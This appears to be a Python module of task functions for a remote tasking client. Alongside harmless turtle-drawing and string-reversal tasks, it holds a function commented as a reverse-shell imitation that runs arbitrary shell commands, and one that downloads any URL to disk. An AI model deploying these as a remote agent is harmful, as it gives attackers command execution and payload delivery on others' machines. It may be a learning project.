# task functions
import os
import subprocess
import requests
import turtle
import random


current_working_directory = os.getcwd()

# Function to draw a shape
def draw_task(shape):
    # Set up the turtle screen
    screen = turtle.Screen()
    screen.bgcolor("white")

    # Create a turtle
    artist = turtle.Turtle()
    artist.shape("turtle")
    artist.speed(1)

    # Function to draw a square
    def draw_square():
        artist.penup()
        artist.goto(random.randint(-200, 200), random.randint(-200, 200))
        artist.pendown()
        artist.color(random.random(), random.random(), random.random())
        for _ in range(4):
            artist.forward(100)
            artist.right(90)

    # Function to draw a circle
    def draw_circle():
        artist.penup()
        artist.goto(random.randint(-200, 200), random.randint(-200, 200))
        artist.pendown()
        artist.color(random.random(), random.random(), random.random())
        artist.circle(100)

    # Function to draw a triangle
    def draw_triangle():
        artist.penup()
        artist.goto(random.randint(-200, 200), random.randint(-200, 200))
        artist.pendown()
        artist.color(random.random(), random.random(), random.random())
        for _ in range(3):
            artist.forward(100)
            artist.right(120)

    if shape == 'square':
        draw_square()
    elif shape == 'circle':
        draw_circle()
    elif shape == 'triangle':
        draw_triangle()
    else:
        print("We don't support that shape yet.")

    return f"Successfully drew {shape}!"



# imitation of reverse shell
def execute_command_task(command):
    global current_working_directory
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        result = result.strip()  # Strip leading and trailing whitespace

        # If the command was a cd command, update the current working directory
        if command.startswith('cd'):
            current_working_directory = os.getcwd()
            return f"Changed directory to {current_working_directory}"

        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"


def download_file_task(url):
    global current_working_directory
    try:
        # Download the file
        response = requests.get(url)
        filename = url.split('/')[-1]
        filepath = os.path.join(current_working_directory, filename)
        with open(filepath, 'wb') as f:
            f.write(response.content)

        return f"Successfully downloaded {filename} to {current_working_directory}"
    except Exception as e:
        return f"Error: {e}"



def reverse_string_task(data):
    return data[::-1]